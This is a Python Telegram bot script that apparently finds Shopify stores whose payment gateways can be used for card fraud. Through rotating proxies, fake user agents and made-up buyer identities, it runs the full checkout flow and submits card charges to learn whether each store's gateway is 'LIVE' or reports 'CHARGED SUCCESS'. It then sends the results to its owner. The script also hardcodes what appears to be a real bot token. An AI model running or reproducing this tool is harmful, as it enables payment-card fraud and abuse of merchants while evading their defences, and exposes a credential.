import telebot
import requests
import threading
import time
import random
import os
import uuid
import logging
import csv
import gc
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from flask import Flask
from fake_useragent import UserAgent

# ==========================================
# ⚙️ CONFIGURATION (RENDER OPTIMIZED)
# ==========================================
BOT_TOKEN = "8468244120:AAGXjaczSUzqCF9xTRtoShEzhmx406XEhCE"
OWNER_ID = 5963548505

# ⚠️ SAFETY SETTINGS FOR FREE TIER
# Do not increase these or Render will kill the bot
MAX_THREADS = 15                   # Keeps CPU usage low
CHUNK_SIZE = 2000                  # Processes sites in small batches to save RAM
PROXY_CHECK_THREADS = 25           # Fast proxy checking
BATCH_SIZE = 50                    # Save file after this many hits
REQUEST_TIMEOUT = 25               # Generous timeout for slow proxies
USER_AGENT_ROTATOR = UserAgent()

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)

# Global State
active_jobs = {}
PROXY_POOL = [] 

# ==========================================
# 🌐 RENDER KEEPER (FLASK SERVER)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return f"👺 GOD MODE ACTIVE | Proxies: {len(PROXY_POOL)}", 200

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def start_keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🛠️ UTILITY FUNCTIONS
# ==========================================

def get_random_identity():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    streets = ["Main St", "Park Ave", "Oak St", "Pine St", "Maple Ave", "Cedar Ln", "Washington St", "Lake View"]
    return {
        "first_name": random.choice(first_names),
        "last_name": random.choice(last_names),
        "email": f"shop.{random.choice(first_names).lower()}{random.randint(1000,9999)}@gmail.com",
        "address": f"{random.randint(100,9999)} {random.choice(streets)}",
        "city": "New York", "state": "NY", "zip": "10001", "country": "US",
        "phone": f"555{random.randint(1000000,9999999)}"
    }

def create_monster_session():
    """Creates a hardened session with retry logic and proxy rotation."""
    session = requests.Session()
    
    if PROXY_POOL:
        proxy_url = random.choice(PROXY_POOL)
        session.proxies = {"http": proxy_url, "https": proxy_url}

    retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries, pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def clean_url(url):
    url = url.strip()
    if not url.startswith("http"): url = f"https://{url}"
    if url.endswith("/"): url = url[:-1]
    return url

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

# ==========================================
# 🧪 PROXY CHECKER ENGINE
# ==========================================

def check_single_proxy(proxy):
    try:
        # Check against Shopify directly
        r = requests.get("https://shopify.com", proxies={"http": proxy, "https": proxy}, timeout=10)
        if r.status_code == 200: return proxy
    except: pass
    return None

def run_proxy_checker_job(message, raw_proxies):
    global PROXY_POOL
    msg = bot.reply_to(message, f"♻️ <b>Scanning {len(raw_proxies)} Proxies...</b>\n<i>Filtering trash...</i>", parse_mode='HTML')
    
    live_proxies = []
    checked = 0
    total = len(raw_proxies)
    last_update = time.time()

    with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
        futures = {executor.submit(check_single_proxy, p): p for p in raw_proxies}
        for future in as_completed(futures):
            checked += 1
            if future.result(): live_proxies.append(future.result())
            
            if time.time() - last_update > 4:
                try:
                    bot.edit_message_text(f"♻️ <b>Proxy Filter Running</b>\n✅ Alive: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📉 Progress: {checked}/{total}", message.chat.id, msg.message_id, parse_mode='HTML')
                    last_update = time.time()
                except: pass

    PROXY_POOL = live_proxies
    gc.collect() # 🧹 CLEAN RAM
    
    bot.edit_message_text(f"✅ <b>Proxy Scan Complete!</b>\n\n🔋 <b>Working:</b> {len(PROXY_POOL)}\n🗑️ <b>Trash:</b> {total - len(PROXY_POOL)}\n\n<b>👹 SYSTEM READY.</b>\nUpload your <b>sites.txt</b> now.", message.chat.id, msg.message_id, parse_mode='HTML')

# ==========================================
# 🧠 THE OG ULTIMATE SITE CHECKER (FULL 10-STEP)
# ==========================================

def check_site_ultimate(site_url):
    session = create_monster_session()
    site_url = clean_url(site_url)
    identity = get_random_identity()
    headers = {
        'User-Agent': USER_AGENT_ROTATOR.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }

    try:
        # 1. FIND PRODUCT
        variant_id = None
        try:
            prod_req = session.get(f"{site_url}/products.json?limit=2", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if prod_req.status_code == 200:
                for p in prod_req.json().get('products', []):
                    for v in p.get('variants', []):
                        if v.get('available'): 
                            variant_id = v['id']
                            break
                    if variant_id: break
        except: pass

        if not variant_id: return "DEAD", "No Products Found", "N/A"

        # 2. ADD TO CART
        cart_headers = headers.copy()
        cart_headers['X-Requested-With'] = 'XMLHttpRequest'
        cart_req = session.post(f"{site_url}/cart/add.js", data={'id': variant_id, 'quantity': 1}, headers=cart_headers, timeout=REQUEST_TIMEOUT, verify=False)
        if cart_req.status_code not in [200, 201]: return "DEAD", "Cart Error", "N/A"

        # 3. CHECKOUT & CAPTCHA
        checkout_req = session.get(f"{site_url}/checkout", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        final_url = checkout_req.url
        if "challenge" in final_url: return "CAPTCHA", "Captcha Redirect", "N/A"

        # 4. AUTH TOKEN
        auth_token = find_between(checkout_req.text, 'name="authenticity_token" value="', '"')
        if not auth_token:
            soup = BeautifulSoup(checkout_req.text, 'html.parser')
            token_input = soup.find('input', {'name': 'authenticity_token'})
            if token_input: auth_token = token_input['value']
        if not auth_token: return "DEAD", "No Token Found", "N/A"

        # 5. CUSTOMER INFO
        info_payload = {
            '_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'contact_information', 'step': 'shipping_method',
            'checkout[email]': identity['email'], 'checkout[shipping_address][first_name]': identity['first_name'],
            'checkout[shipping_address][last_name]': identity['last_name'], 'checkout[shipping_address][address1]': identity['address'],
            'checkout[shipping_address][city]': identity['city'], 'checkout[shipping_address][country]': 'US',
            'checkout[shipping_address][province]': 'NY', 'checkout[shipping_address][zip]': '10001', 'checkout[shipping_address][phone]': identity['phone']
        }
        ship_req = session.post(final_url, data=info_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        if "challenge" in ship_req.url: return "CAPTCHA", "Captcha at Info", "N/A"

        # 6. SHIPPING METHOD
        ship_rate = find_between(ship_req.text, 'data-shipping-method="', '"') or "shopify-Standard-0.00"
        pay_req = session.post(final_url, data={'_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'shipping_method', 'step': 'payment_method', 'checkout[shipping_rate][id]': ship_rate}, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)

        # 7. GATEWAY
        gateway_id = find_between(pay_req.text, 'name="checkout[payment_gateway]" value="', '"')
        if not gateway_id:
            soup_pay = BeautifulSoup(pay_req.text, 'html.parser')
            g_input = soup_pay.find('input', {'name': 'checkout[payment_gateway]'})
            if g_input: gateway_id = g_input['value']
        if not gateway_id: return "DEAD", "No Gateway ID", "N/A"

        # 8. VAULT CARD
        vault_payload = {"credit_card": {"number": "4000000000000000", "name": "TEST", "month": "12", "year": "2029", "verification_value": "123"}, "payment_session_scope": urlparse(site_url).netloc}
        vault_req = session.post('https://deposit.us.shopifycs.com/sessions', json=vault_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT, verify=False)
        payment_token = vault_req.json().get('id')
        if not payment_token: return "DEAD", "Vault Failed", gateway_id

        # 9. CHARGE
        final_payload = {'_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'payment_method', 'step': '', 's': payment_token, 'checkout[payment_gateway]': gateway_id, 'checkout[credit_card][vault]': 'false', 'checkout[total_price]': '1000', 'complete': '1'}
        final_req = session.post(final_url, data=final_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        
        # 10. RESULT
        resp = final_req.text.lower()
        if "/processing" in final_req.url:
            time.sleep(1.5)
            resp = session.get(final_req.url + "?from_processing_page=1", headers=headers, verify=False).text.lower()

        if any(k in resp for k in ["declined", "security code", "zip code", "cvv", "insufficient"]):
            return "LIVE", "Card Declined (Gateway Alive)", gateway_id
        elif "thank you" in resp or "confirmed" in resp:
            return "LIVE", "CHARGED SUCCESS", gateway_id
        
        return "DEAD", "Generic Failure", gateway_id

    except Exception as e: return "DEAD", f"Error: {str(e)}", "N/A"

# ==========================================
# 🧵 SMART JOB MANAGER (AUTO-SPLITTER)
# ==========================================

def chunk_list(data, size):
    for i in range(0, len(data), size): yield data[i:i + size]

def run_main_job(message, all_sites):
    if not PROXY_POOL:
        bot.reply_to(message, "⚠️ <b>NO PROXIES!</b> Upload proxy file first.")
        return

    # 🛡️ RENDER GUARD: Split into safe chunks
    chunks = list(chunk_list(all_sites, CHUNK_SIZE))
    total_chunks = len(chunks)

    bot.reply_to(message, f"👺 <b>MONSTER HUNT STARTED</b>\n🎯 Targets: {len(all_sites)}\n🔪 Batches: {total_chunks}\n🚀 Threads: {MAX_THREADS}", parse_mode='HTML')

    for i, sites_batch in enumerate(chunks):
        current = i + 1
        job_id = str(uuid.uuid4())[:6]
        active_jobs[job_id] = {'total': len(sites_batch), 'checked': 0, 'live': 0, 'dead': 0, 'captcha': 0}
        
        status_msg = bot.send_message(message.chat.id, f"🔄 <b>Batch {current}/{total_chunks}</b>\n<i>Checking {len(sites_batch)} sites...</i>", parse_mode='HTML')
        live_buffer = []
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(check_site_ultimate, site): site for site in sites_batch}
            last_edit = time.time()
            
            for future in as_completed(futures):
                try:
                    status, msg, gateway = future.result()
                    active_jobs[job_id]['checked'] += 1
                    
                    if status == "LIVE":
                        active_jobs[job_id]['live'] += 1
                        live_buffer.append(f"{futures[future]} | {gateway} | {msg}")
                    elif status == "CAPTCHA": active_jobs[job_id]['captcha'] += 1
                    else: active_jobs[job_id]['dead'] += 1
                    
                    if time.time() - last_edit > 6:
                        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks)
                        last_edit = time.time()
                except: pass
        
        if live_buffer: send_file(message.chat.id, live_buffer, True, current)
        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, True)
        
        # 🧹 RAM CLEANUP
        del active_jobs[job_id]
        futures.clear()
        gc.collect() 
        time.sleep(5) # Cool down CPU

    bot.send_message(message.chat.id, "🏁 <b>ALL BATCHES COMPLETE!</b> 👺", parse_mode='HTML')

def update_stats(chat_id, msg_id, job_id, batch, total, final=False):
    s = active_jobs.get(job_id)
    if not s: return
    try:
        pct = int((s['checked']/s['total'])*100)
        bar = "█" * int(pct/10) + "░" * (10-int(pct/10))
        text = (f"{'✅ BATCH DONE' if final else '👺 HUNTING'}\n📦 Batch: {batch}/{total}\n<code>{bar}</code> {pct}%\n\n✅ Live: {s['live']}\n💀 Dead: {s['dead']}\n🛡️ Cap: {s['captcha']}\n📉 {s['checked']}/{s['total']}")
        bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML')
    except: pass

def send_file(chat_id, lines, final, batch=1):
    try:
        fn = f"Live_Batch_{batch}_{int(time.time())}.txt"
        with open(fn, 'w') as f: f.write("\n".join(lines))
        with open(fn, 'rb') as f: bot.send_document(chat_id, f, caption=f"📦 <b>Batch {batch} Hits</b>")
        os.remove(fn)
    except: pass

# ==========================================
# 🤖 HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def handle_start(m): bot.reply_to(m, "👺 <b>GOD MODE</b>\n1. Upload Proxies\n2. Upload Sites")

@bot.message_handler(content_types=['document'])
def handle_doc(m):
    if str(m.from_user.id) != str(OWNER_ID): return
    try:
        file_name = m.document.file_name.lower()
        file_info = bot.get_file(m.document.file_id)
        data = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        proxies = []
        is_proxy_file = False

        # 1. CSV DETECTION (Check filename first!)
        if file_name.endswith('.csv'):
            is_proxy_file = True
            import io
            # Use strict parsing for your specific headers
            reader = csv.DictReader(io.StringIO(data))
            for r in reader:
                # Handle keys safely (strip spaces)
                row = {k.strip(): v.strip() for k, v in r.items() if k}
                
                # specific check for your file structure
                host = row.get('host') or row.get('ip')
                port = row.get('port')
                user = row.get('username') or row.get('user')
                pwd = row.get('password') or row.get('pass')

                if host and port and user and pwd:
                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")

        # 2. TXT DETECTION (Check content pattern)
        else:
            lines = [x.strip() for x in data.split('\n') if len(x.strip()) > 5]
            # If first line has ':' or '@' and isn't a website, it's a proxy list
            first_line = lines[0] if lines else ""
            if (':' in first_line or '@' in first_line) and not first_line.startswith("http"):
                is_proxy_file = True
                proxies = lines
            else:
                # Otherwise, it's a Site List
                threading.Thread(target=run_main_job, args=(m, lines)).start()
                return

        # 3. EXECUTE PROXY CHECKER
        if is_proxy_file:
            if proxies:
                bot.reply_to(m, f"📥 <b>Imported {len(proxies)} Proxies</b>\n<i>Starting Checker...</i>", parse_mode='HTML')
                threading.Thread(target=run_proxy_checker_job, args=(m, proxies)).start()
            else:
                bot.reply_to(m, "⚠️ <b>CSV Error:</b> Could not find 'host', 'port', 'username', 'password' headers.")

    except Exception as e:
        bot.reply_to(m, f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')


if __name__ == "__main__":
    start_keep_alive()
    bot.infinity_polling()

